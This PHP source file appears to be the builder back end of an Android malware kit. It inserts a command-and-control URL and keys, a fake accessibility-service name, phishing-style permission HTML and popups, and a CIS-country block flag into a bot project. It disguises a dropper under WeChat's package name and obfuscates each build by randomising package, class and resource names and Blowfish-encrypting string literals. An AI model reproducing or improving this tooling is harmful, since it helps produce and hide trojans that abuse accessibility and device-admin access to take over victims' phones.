<?php

class utils
{
    function replaceStringProject(
        $url,
        $name_app,
        $name_accessibility,
        $tag,
        $key,
        $initialkey,

        $ignore_debug,
        $ch_cis,
        $ch_wait,
        $build_inj,

        $white_app,
        $html,
        $htmlPopup)
    {
        //*** sert
        $this->replaceStringFile($_SESSION['app'] . "build.gradle", ".sert.", $_SESSION['path_temp'] . "key.jks");
        //*** name
        $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', 'android:label="TaiPan"', 'android:label="' . $name_app . '"');
        $this->replaceStringFile($_SESSION['app_src_main'] . 'AndroidManifest.xml', 'android:label="TaiPan"', 'android:label="' . $name_app . '"');
        //*** name accessibility
        $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', 'android:label="Start Accessibility"', 'android:label="' . $name_accessibility . '"');
        //*** white app
        $this->replaceStringFile($_SESSION['app_src'] . 'com/tencent/mm/Main2.kt', '%INSERT_APP_TO_START_HERE%', $white_app);
        //*** Constants
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_URL_HERE%', $url);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_KEY_HERE%', $key);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_INITIAL_KEY_HERE%', $initialkey);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_TAG_HERE%', $tag);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_ACCESS1_HERE%', $name_accessibility);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%INSERT_ACCESS2_HERE%', $name_accessibility);
        //*** debug
        if ($ignore_debug != '1') {
            $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%debug%', '%debug1%');
        }
        if ($ch_cis != '1') {
            $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%blockCIS%', '%blockCIS1%');
        }
        if ($ch_wait == '1') {
            $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/globp/Constantsfd.kt', '%addWaitView%', '%addWaitView1%');
        }
        //*** html
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/PermissionsActivity.kt', '%INSERT_HTML_HERE%', $html);
        $this->replaceStringFile($_SESSION['bot_src'] . 'com/xxx/zzz/PermissionsActivity.kt', '%INSERT_POPUP_HERE%', $htmlPopup);
        //*** minify
       if ($build_inj == '1') {
           $this->replaceStringFile($_SESSION['app'] . "build.gradle", "shrinkResources true", "shrinkResources false");
           $this->replaceStringFile($_SESSION['app'] . "build.gradle", "minifyEnabled true", "minifyEnabled false");
           $this->replaceStringFile($_SESSION['bot'] . "build.gradle", "minifyEnabled true", "minifyEnabled false");
       }
    }

    function cryptPackage2($package_xiaomi)
    {
        if ($package_xiaomi != '1') {
            $newPackage = array('com', $this->readable_random_string(rand(12, 16)), $this->readable_random_string(rand(4, 8)));
            $strOldPackage = 'com.tencent.mm';
            $strNewPackage = $newPackage[0] . '.' . $newPackage[1] . '.' . $newPackage[2];

            //---Manifest---
            $this->replaceStringFile($_SESSION['app_src_main'] . 'AndroidManifest.xml', $strOldPackage, $strNewPackage);
            //---build.gradle---
            $this->replaceStringFile($_SESSION['app'] . 'build.gradle', $strOldPackage, $strNewPackage);

            //---File Class Java---
            foreach ($this->arrayAllFiles() as $files) { //replace name class to files!
                $this->replaceStringFile($files, $strOldPackage, $strNewPackage);
            }
            //---Rename Folder Package---
            //* 0
            //* 1
            rename($_SESSION['app_src'] . 'com/tencent'
                , $_SESSION['app_src'] . 'com/' . $newPackage[1]);
            //* 2
            rename($_SESSION['app_src'] . 'com/' . $newPackage[1] . '/mm'
                , $_SESSION['app_src'] . 'com/' . $newPackage[1] . '/' . $newPackage[2]);
        }
    }

    function replaceNameFileMain2JavaClass()
    {
        foreach ($this->arrayAllFiles() as $file) {
            $dir = dirname($file);
            $ext = pathinfo($file, PATHINFO_EXTENSION);

            $nameFileOld = basename($file);
            if (str_contains($nameFileOld, 'Main2')) {
                $nameClassOld = str_replace("." . $ext, "", $nameFileOld);
                $nameFileNew = $this->readable_random_string() . '.' . $ext;
                $nameClassNew = str_replace("." . $ext, "", $nameFileNew);
                if (!is_dir("$dir/$nameFileOld")) {
                    rename("$dir/$nameFileOld", "$dir/$nameFileNew");
                    foreach ($this->arrayAllFiles() as $file2) { //replace name class to files!
                        $this->replaceStringFile($file2, "$nameClassOld", "$nameClassNew");
                    }
                    $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', "$nameClassOld", "$nameClassNew");
                    $this->replaceStringFile($_SESSION['app_src_main'] . 'AndroidManifest.xml', "$nameClassOld", "$nameClassNew");
                }
            }
        }
    }

    function cryptAllString()
    {
        foreach ($this->arrayAllFiles() as $file) {
            $matches = array();
            system('chmod 777 ' . $file);
            $textFile = file_get_contents($file);
            preg_match_all('~"([^"]*)"~u', $textFile, $matches);
            $countArray = count(explode('"', $textFile)) / 2;

            if ($countArray >= 1) {
                $this->crypt_str($file);
            }
        }
    }

    function replaceAllFolder($dir)
    {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $oldFolder) {
            $folder = $dir . $oldFolder;
            if (is_dir($folder)) {
                $newFolderr = $this->readable_random_string();
                foreach ($this->arrayAllFiles() as $files) {
                    $this->replaceStringFile($files, ".$oldFolder", ".$newFolderr");
                }
                rename($folder, $dir . $newFolderr);
                $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', ".$oldFolder.", ".$newFolderr.");
                $this->replaceAllFolder($dir . $newFolderr . "/");
            }
        }
    }

    function replaceNameFileJavaClass($build_inj)
    {
        foreach ($this->getAllFiles($_SESSION['bot_src']) as $file) {
            $dir = dirname($file);
            $ext = pathinfo($file, PATHINFO_EXTENSION);

            $nameFileOld = basename($file);

            if ((!str_contains($nameFileOld, 'Payload') || $build_inj != '1') && !str_contains($nameFileOld, 'package-info')) {
                $nameClassOld = str_replace("." . $ext, "", $nameFileOld);
                $nameFileNew = $this->readable_random_string() . '.' . $ext;
                $nameClassNew = str_replace("." . $ext, "", $nameFileNew);
                if (!is_dir("$dir/$nameFileOld")) {
                    rename("$dir/$nameFileOld", "$dir/$nameFileNew");
                    foreach ($this->arrayAllFiles() as $file2) { //replace name class to files!
                        $this->replaceStringFile($file2, "$nameClassOld", "$nameClassNew");
                    }
                    $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', "$nameClassOld", "$nameClassNew");
                }
            }
        }
    }

    function file_edit_contents($file_name, $line, $new_value)
    {
        $file = explode("\n", rtrim(file_get_contents($file_name)));
        $file[$line] = $file[$line] . $new_value;
        $file = implode("\n", $file);
        file_put_contents($file_name, $file);
    }

    function arrayAllFiles()
    {
        $arrayFolder = array();;
        foreach ($this->getAllFiles($_SESSION['bot_src']) as $files) { //replace name class to files!
            if (!is_dir($files))
                $arrayFolder[] = $files;
        }
        foreach ($this->getAllFiles($_SESSION['app_src']) as $files) { //replace name class to files!
            if (!is_dir($files))
                $arrayFolder[] = $files;
        }
        return $arrayFolder;
    }

    function crypt_str($file_name)
    {
        $file = explode("\n", rtrim(file_get_contents($file_name)));

        require_once 'blowfish.php';
        $blowfish = new blowfish();

        if (!str_contains($file[0], "clipherp")) {
            foreach ($file as $i => $key) {
                $matches = array();
                $textFile = $key;
                preg_match_all('~"([^"]*)"~u', $textFile, $matches);

                $countArray = substr_count($textFile, '"') / 2;

                for ($ii = 0; $ii < $countArray; $ii++) {
                    if (
                        count($matches[1]) < $ii
                        && $matches[1][$ii] != null
                        && $matches[1][$ii] != ""
                        && strlen($matches[1][$ii]) <= 2048
                        && !str_contains($textFile, "@SuppressLint")
                        && !str_contains($textFile, '"""')
                        && !str_contains($textFile, "\\\"")
                        && !str_contains($textFile, "['\"']")
                        && !str_contains($textFile, '\"')
                        && !str_contains($textFile, '\'"\'')
                        && !str_contains($textFile, "base64Decode")
                        && !str_contains($textFile, "@Syntax(")
                        && !str_contains($textFile, "@Suppress")
                        && !str_contains($textFile, "@Syntaxqaxcx(")
                        && !str_contains($textFile, "  case ")
                        && !str_contains($textFile, "@Deprecated")
                        && !str_contains($textFile, " private static final String ")
                        && !str_contains($textFile, "@JvmName")
                        && !str_contains($textFile, "@file:")
                        && !str_contains($textFile, "ReplaceWith(")
                        && !str_contains($textFile, " const val ")
                        && !str_contains($textFile, "$")) {
                        $textEn = $blowfish->Encrypt($matches[1][$ii]);
                        $textFile = str_replace("\"" . $matches[1][$ii] . "\"", "com.xxx.zzz.clipherp.Cryptor.decryptstr(\"$textEn\")", $textFile); //Replace Text
                    }
                }
                $file[$i] = $textFile;
            }
        }

        $file = implode("\n", $file);
        file_put_contents($file_name, $file);
    }

    function getFiles($path)
    {
        $dir = opendir($path);
        $array = array();
        $var = 0;
        while ($file = readdir($dir)) {
            if (!is_dir($path . $file) && $file != '.' && $file != '..') {
                $array[$var] = $path .$file;
                $var++;
            }
        }
        return $array;
    }

    function getAllFiles($dir, &$results = array())
    {
        $files = scandir($dir);
        foreach ($files as $value) {
            $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
            if (!is_dir($path)) {
                $results[] = $path;
            } else if ($value != "." && $value != "..") {
                $this->getAllFiles($path, $results);
                $results[] = $path;
            }
        }

        return $results;
    }

    function readable_random_string($length = -1)
    {
        if ($length == -1) {
            $length = rand(4, 16);
        }

        $string = '';
        $vowels = array("a", "e", "i", "o", "u");
        $consonants = array(
            'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm',
            'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z'
        );

        $max = $length / 2;
        for ($i = 1; $i <= $max; $i++) {
            $string .= $consonants[rand(0, 19)];
            $string .= $vowels[rand(0, 4)];
        }

        return $string;
    }

    function cryptRes()
    {
        //---Admin Device ---
        $newNameFileAdminDevice = $this->readable_random_string();
        $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', 'xml/adm', 'xml/' . $newNameFileAdminDevice);
        rename($_SESSION['bot_src_main'] . 'res/xml/adm.xml',
            $_SESSION['bot_src_main'] . 'res/xml/' . $newNameFileAdminDevice . '.xml');

        //---Accessibility ---
        $newNameFileAccessibility = $this->readable_random_string();
        $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', 'xml/serviceconfig', 'xml/' . $newNameFileAccessibility);
        rename($_SESSION['bot_src_main'] . 'res/xml/serviceconfig.xml',
            $_SESSION['bot_src_main'] . 'res/xml/' . $newNameFileAccessibility . '.xml');

        // layout xml rename
        $newNameLay2 = $this->readable_random_string();
        rename($_SESSION['bot_src_main'] . 'res/layout/custom_notif_zzz.xml',
            $_SESSION['bot_src_main'] . 'res/layout/' . $newNameLay2 . '.xml');
        foreach ($this->arrayAllFiles() as $files) {
            $this->replaceStringFile($files, "custom_notif_zzz", $newNameLay2);
        }

        $newNameLay3 = $this->readable_random_string();
        rename($_SESSION['bot_src_main'] . 'res/layout/lustom_notif_zzz.xml',
            $_SESSION['bot_src_main'] . 'res/layout/' . $newNameLay3 . '.xml');
        foreach ($this->arrayAllFiles() as $files) {
            $this->replaceStringFile($files, "lustom_notif_zzz", $newNameLay3);
        }
    }
    
    function createKey()
    {
        $ran1 = $this->readable_random_string();
        $ran2 = $this->readable_random_string();
        $sign_tool = "keytool -genkey -v -keystore " . $_SESSION['path_temp'] . "key.jks -alias key0 -keyalg RSA -keysize 2048 -validity 999 -storepass 123123 -keypass 123123 -dname \"CN=$ran1,O=$ran2,C=US\"";
        system($sign_tool);
    }

    function createIcon()
    {
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 72x72   " . $_SESSION['bot_src_main'] . "res/mipmap-hdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 48x84   " . $_SESSION['bot_src_main'] . "res/mipmap-mdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 96x96   " . $_SESSION['bot_src_main'] . "res/mipmap-xhdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 144x144 " . $_SESSION['bot_src_main'] . "res/mipmap-xxhdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 192x192 " . $_SESSION['bot_src_main'] . "res/mipmap-xxxhdpi/ic_launcher.png");

        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 72x72   " . $_SESSION['app_src_main'] . "res/mipmap-hdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 48x84   " . $_SESSION['app_src_main'] . "res/mipmap-mdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 96x96   " . $_SESSION['app_src_main'] . "res/mipmap-xhdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 144x144 " . $_SESSION['app_src_main'] . "res/mipmap-xxhdpi/ic_launcher.png");
        system(" convert " . $_SESSION['path_temp'] . "icon.png -resize 192x192 " . $_SESSION['app_src_main'] . "res/mipmap-xxxhdpi/ic_launcher.png");
    }

    function cryptPackage()
    {
        $newPackage = array('com', $this->readable_random_string(rand(12, 16)), $this->readable_random_string(rand(4, 8)));
        $strOldPackage = 'com.xxx.zzz';
        $strNewPackage = $newPackage[0] . '.' . $newPackage[1] . '.' . $newPackage[2];

        //---Manifest---
        $this->replaceStringFile($_SESSION['bot_src_main'] . 'AndroidManifest.xml', $strOldPackage, $strNewPackage);
        //---build.gradle---
        $this->replaceStringFile($_SESSION['bot'] . 'build.gradle', $strOldPackage, $strNewPackage);

        //---File Class Java---
        foreach ($this->arrayAllFiles() as $files) { //replace name class to files!
            $this->replaceStringFile($files, $strOldPackage, $strNewPackage);
        }
        //---Rename Folder Package---
        //* 0
        //* 1
        rename($_SESSION['bot_src']. 'com/xxx'
            , $_SESSION['bot_src'] . 'com/' . $newPackage[1]);
        //* 2
        rename($_SESSION['bot_src'] . 'com/' . $newPackage[1] . '/zzz'
            , $_SESSION['bot_src'] . 'com/' . $newPackage[1] . '/' . $newPackage[2]);
    }

    function replaceStringFile($pathFile, $String, $replaceString)
    {
        $strFile = file_get_contents($pathFile);
        $strFile = str_replace($String, $replaceString, $strFile);
        file_put_contents($pathFile, $strFile);
    }
}